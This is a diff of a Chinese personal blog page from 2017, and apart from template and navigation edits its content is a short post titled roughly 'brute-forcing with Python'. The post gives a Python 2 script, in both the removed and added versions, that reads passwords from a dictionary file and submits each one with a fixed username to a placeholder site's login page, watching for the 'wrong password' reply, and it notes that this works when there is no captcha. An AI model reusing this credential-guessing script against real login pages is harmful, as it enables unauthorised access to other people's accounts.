@@ -16,12 +16,13 @@
   
   
   
-    <meta name="description" content="title: python进行暴力破解date: 2017-03-05 10:58:52
-tags:根据字典文件,使用python进行暴力破解,程序很简单注：针对没有验证码的情况实例代码
-#encoding=utf-8
-import httplib,urllib
-conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
-f=open(&quo...">
+    <meta name="description" content="根据字典文件,使用python进行暴力破解,程序很简单注：针对没有验证码的情况实例代码
+ #encoding=utf-8
+    import httplib,urllib
+    conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
+    f=open(&quot;dict.txt&quot;)
+    while 1:
+      ...">
   
   <title>阳光男孩 [ shiny-boy ]</title>
   
@@ -44,13 +45,22 @@ f=open(&quo...">
 <body>
 <div class="side-navigate hide-area">
   
-  
-    <div class="item next">
-      <a href="/2017/03/05/利用hexo与nodejs搭建博客/">
+    <div class="item prev">
+      <a href="/2017/03/05/never-give-up/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        利用hexo与nodejs搭建博客
+        never give up
+      </div>
+    </div>
+  
+  
+    <div class="item next">
+      <a href="/2017/03/05/初识hexo命令/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        初识hexo命令
       </div>
     </div>
   
@@ -127,7 +137,7 @@ f=open(&quo...">
   <article id="post">
     <h1>空标题</h1>
     <p class="page-title-sub">
-      <span id = "post-title-date">撰写于 2017-03-06</span>
+      <span id = "post-title-date">撰写于 2017-03-05</span>
       
         <span id = "post-title-updated">修改于 2017-03-06</span>
       
@@ -135,45 +145,45 @@ f=open(&quo...">
       
     </p>
     
-    <hr>
-<p>title: python进行暴力破解<br>date: 2017-03-05 10:58:52</p>
-<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
-<pre><code>#encoding=utf-8
-import httplib,urllib
-conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
-f=open(&quot;dict.txt&quot;)
-while 1:
-    pwd=f.readline().strip()
-    if not pwd:
-        print &apos;字典已比对完。&apos;
-        break
-    params = urllib.urlencode({&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd})
-    headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;}
-    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)
-    r = conn.getresponse()
-    print r.status, r.reason
-    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理
-    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd
-conn.close()
-</code></pre>
+    <p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
+<p> <code>#encoding=utf-8
+    import httplib,urllib
+    conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
+    f=open(&quot;dict.txt&quot;)
+    while 1:
+        pwd=f.readline().strip()
+        if not pwd:
+            print &#39;字典已比对完。&#39;
+            break
+        params = urllib.urlencode({&#39;username&#39;: &#39;xxx&#39;, &#39;mod&#39;: &#39;&#39;, &#39;password&#39;: pwd})
+        headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;}
+        conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)
+        r = conn.getresponse()
+        print r.status, r.reason
+        data1 = r.read().decode(&#39;gbk&#39;)#编码根据实际情况酌情处理
+        print data1.index(u&#39;您输入的密码有误&#39;),&#39;您输入的密码\&#39;%s\&#39;有误&#39;%pwd
+    conn.close()</code></p>
+
   </article>
   <div class="random-toc-area">
   <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
   <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
   <div class="random-toc">
     <h2>目录</h2>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tags"><span class="toc-text">tags:</span></a></li></ol>
+    
   </div>
 </div>
 
   
 <nav id="pagination">
   
-
+    <a href="/2017/03/05/never-give-up/" class="prev">&larr; 上一篇 never give up</a>
   
 
   
-    <a href="/2017/03/05/利用hexo与nodejs搭建博客/" class="next">下一篇 利用hexo与nodejs搭建博客 &rarr;</a>
+
+  
+    <a href="/2017/03/05/初识hexo命令/" class="next">下一篇 初识hexo命令 &rarr;</a>
   
 </nav>
 
